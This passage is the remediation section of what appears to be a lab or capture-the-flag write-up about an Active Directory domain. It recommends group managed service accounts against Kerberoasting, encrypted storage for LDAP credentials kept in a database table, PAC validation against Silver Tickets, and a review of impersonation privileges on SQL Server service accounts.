**Migrate service accounts to Group Managed Service Accounts (gMSAs) to eliminate Kerberoasting.** `sqlsvc` had a registered SPN and a crackable password. gMSAs are managed by the DC, have 240-byte random passwords rotated automatically, and are not susceptible to offline cracking regardless of the Kerberos encryption type.

**Remove plaintext credentials from database tables.** The `ScrambleHR.UserImport` table stored LDAP credentials as cleartext strings. Credentials required for LDAP bind operations should be stored encrypted, managed via a secrets manager, or replaced with a dedicated service account using integrated Windows authentication.

**Enforce PAC validation to mitigate Silver Ticket attacks.** Windows Server 2022 and later include the ability to require services to validate the PAC with the KDC on each authentication. Enabling `ValidateKdcPacSignature` closes the Silver Ticket attack surface at the cost of additional DC load per service ticket validation.

**Remove `SeImpersonatePrivilege` from service accounts where not operationally required.** SQL Server legitimately uses impersonation for database-level operations, but the scope of this privilege should be reviewed. Running SQL Server under a gMSA reduces the exploitation surface further, as a gMSA cannot be Kerberoasted and its token cannot be used to pivot laterally.
